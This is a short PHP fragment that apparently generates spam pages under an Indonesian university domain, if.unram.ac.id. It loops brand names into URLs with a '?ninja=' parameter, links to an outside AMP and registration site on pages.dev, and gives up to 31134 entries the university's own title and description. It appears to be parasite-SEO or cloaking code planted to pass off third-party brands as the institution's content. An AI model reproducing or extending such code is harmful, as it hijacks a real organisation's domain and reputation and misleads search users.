...
$baseAuthor = $BRAND;
$URL  = "https://if.unram.ac.id/unram/?ninja=$BRAND";
$PAGEURL = "https://if.unram.ac.id/unram/?ninja=$BRAND";
$AMP = "https://amp-itsmandala.pages.dev/$BRAND";
$DAFTAR = "https://amp-itsmandala.pages.dev/";
...
if ($NUMLIST >= 1 && $NUMLIST <= 31134) {
    $TITLE = "$BRAND # PSTI UNRAM ";
    $DESCRIPTION = "$BRAND Merupakan lembaga yang membina penelitian dan pengembangan tingkat atas di bidang teknologi informatika dan komunikasi di tingkat nasional sambil meraih pengakuan internasional.
";
    $description = "$BRAND Merupakan lembaga yang membina penelitian dan pengembangan tingkat atas di bidang teknologi informatika dan komunikasi di tingkat nasional sambil meraih pengakuan internasional.
";
}
